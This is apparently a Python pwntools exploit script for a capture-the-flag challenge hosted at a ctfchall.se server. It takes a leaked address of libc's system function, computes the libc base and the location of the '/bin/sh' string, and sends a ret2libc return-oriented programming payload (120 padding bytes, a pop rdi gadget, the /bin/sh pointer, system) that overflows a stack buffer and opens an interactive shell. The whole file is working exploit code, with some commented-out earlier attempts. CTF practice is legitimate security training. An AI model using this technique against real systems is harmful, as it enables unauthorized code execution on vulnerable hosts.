#!/usr/bin/env python3
import pwn
import time

chall = "./chall"

pwn.context.log_level = "debug"
pwn.context.binary = elf = pwn.ELF(chall)
libc = pwn.ELF("./libc.so.6")

# p = pwn.process(chall)
p = pwn.remote("mitt-andra-program.ctfchall.se", 50000, ssl=True)

p.recvuntil(b"r ")

sys_addr = int(p.recvuntil(b".", drop=True), 16)
p.recvline()

# p.recvuntil(b"r ")
#
# main_addr = int(p.recvuntil(b".", drop=True), 16)

print(f"{sys_addr = }")
# print(f"{main_addr = }")
#
# elf.address = main_addr - elf.sym["main"]

libc_leak = sys_addr - libc.sym["system"]
libc.address = libc_leak

binsh = next(libc.search(b"/bin/sh"))

print(f"{binsh = }")

# payload += pwn.p64(sys_addr)
# payload += pwn.p64(0)
# payload += b"sh;\x00"

# rop = pwn.ROP(libc)
# rop.raw("A" * 120)
# rop.system(binsh)
#
# p.sendline(rop.chain())

assert libc.sym["system"] == sys_addr
# assert main_addr == elf.sym["main"]

rop = pwn.ROP(libc)
g = rop.find_gadget(["pop rdi", "ret"])[0]

payload = b'A' * 120
payload += pwn.p64(g)
payload += pwn.p64(binsh)
payload += pwn.p64(libc.sym["system"])

print(f"{len(payload) = }")

print(b'\n' in payload)

p.clean()
p.sendline(payload)

p.interactive()
